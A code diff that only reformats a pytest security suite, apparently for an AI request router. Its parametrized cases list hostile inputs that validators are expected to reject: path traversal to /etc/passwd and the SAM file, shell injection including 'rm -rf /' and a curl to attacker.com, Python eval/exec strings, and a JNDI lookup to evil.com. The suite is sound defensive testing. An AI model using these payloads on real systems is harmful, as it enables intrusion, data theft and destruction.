@@ -19,15 +19,18 @@ from router.config_loader import ConfigLoader
 class TestPathTraversalPrevention:
     """Test path traversal attack prevention"""
 
-    @pytest.mark.parametrize("malicious_path", [
-        "../../../etc/passwd",
-        "..\\..\\..\\windows\\system32\\config\\sam",
-        "foo/../../etc/shadow",
-        "foo/../../../etc/passwd",
-        ".../.../etc/passwd",
-        "./../..",
-        "....//....//etc/passwd",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_path",
+        [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32\\config\\sam",
+            "foo/../../etc/shadow",
+            "foo/../../../etc/passwd",
+            ".../.../etc/passwd",
+            "./../..",
+            "....//....//etc/passwd",
+        ],
+    )
     def test_path_traversal_blocked(self, malicious_path):
         """Test that various path traversal attempts are blocked"""
         with pytest.raises(ValidationError, match="traversal|not allowed"):
@@ -67,16 +70,19 @@ class TestPathTraversalPrevention:
 class TestCommandInjectionPrevention:
     """Test command injection prevention"""
 
-    @pytest.mark.parametrize("injection_attempt", [
-        "test; rm -rf /",
-        "test | cat /etc/passwd",
-        "test && whoami",
-        "test || evil",
-        "test `whoami`",
-        "test $(whoami)",
-        "test; $(curl attacker.com)",
-        "; drop table users; --",
-    ])
+    @pytest.mark.parametrize(
+        "injection_attempt",
+        [
+            "test; rm -rf /",
+            "test | cat /etc/passwd",
+            "test && whoami",
+            "test || evil",
+            "test `whoami`",
+            "test $(whoami)",
+            "test; $(curl attacker.com)",
+            "; drop table users; --",
+        ],
+    )
     def test_command_injection_blocked(self, injection_attempt):
         """Test that command injection attempts are blocked"""
         with pytest.raises(ValidationError, match="shell metacharacters"):
@@ -130,24 +136,30 @@ class TestInputSanitization:
         with pytest.raises(ValidationError):
             SafePath(path="test\x01file.txt")
 
-    @pytest.mark.parametrize("injection_pattern", [
-        "__import__('os').system('ls')",
-        "eval('os.system(\"ls\")')",
-        "exec('import os; os.system(\"ls\")')",
-        "compile('print(1)', 'test', 'exec')",
-    ])
+    @pytest.mark.parametrize(
+        "injection_pattern",
+        [
+            "__import__('os').system('ls')",
+            "eval('os.system(\"ls\")')",
+            "exec('import os; os.system(\"ls\")')",
+            "compile('print(1)', 'test', 'exec')",
+        ],
+    )
     def test_python_code_injection_detection(self, injection_pattern):
         """Test detection of Python code injection attempts"""
         with pytest.raises(ValidationError, match="unsafe pattern"):
             ExecuteRequest(request=injection_pattern)
 
-    @pytest.mark.parametrize("template_injection", [
-        "${java:runtime}",
-        "${jndi:ldap://evil.com/a}",
-        "{{7*7}}",
-        "{{config}}",
-        "${7*7}",
-    ])
+    @pytest.mark.parametrize(
+        "template_injection",
+        [
+            "${java:runtime}",
+            "${jndi:ldap://evil.com/a}",
+            "{{7*7}}",
+            "{{config}}",
+            "${7*7}",
+        ],
+    )
     def test_template_injection_detection(self, template_injection):
         """Test detection of template injection attempts"""
         with pytest.raises(ValidationError, match="unsafe pattern"):
@@ -165,8 +177,7 @@ class TestAPIKeyHandling:
         # errors should not expose it
         try:
             client = AnthropicClient(
-                api_key="sk-ant-secret-key-do-not-leak",
-                model_config={"provider": "anthropic"}
+                api_key="sk-ant-secret-key-do-not-leak", model_config={"provider": "anthropic"}
             )
         except Exception as e:
             error_msg = str(e).lower()
@@ -203,10 +214,7 @@ class TestDenialOfService:
     def test_context_size_limit(self):
         """Test context size limits"""
         with pytest.raises(ValidationError):
-            ExecuteRequest(
-                request="test",
-                context_size=20_000_000  # 20M tokens - unrealistic
-            )
+            ExecuteRequest(request="test", context_size=20_000_000)  # 20M tokens - unrealistic
 
     def test_argument_count_limit(self):
         """Test subprocess argument count limit"""
@@ -222,9 +230,7 @@ class TestSecureDefaults:
         """Test that unexpected fields are rejected (prevent mass assignment)"""
         with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
             ExecuteRequest(
-                request="test",
-                is_admin=True,  # Should be rejected
-                bypass_security=True
+                request="test", is_admin=True, bypass_security=True  # Should be rejected
             )
 
     def test_whitespace_normalized(self):
@@ -251,8 +257,10 @@ class TestErrorHandling:
 
         error_msg = str(exc_info.value)
         # Should not leak full system paths
-        assert "/nonexistent/path/that/is/very/long" not in error_msg or \
-               "Configuration file not found" in error_msg
+        assert (
+            "/nonexistent/path/that/is/very/long" not in error_msg
+            or "Configuration file not found" in error_msg
+        )
 
     def test_validation_errors_are_generic(self):
         """Test that validation errors don't leak implementation details"""
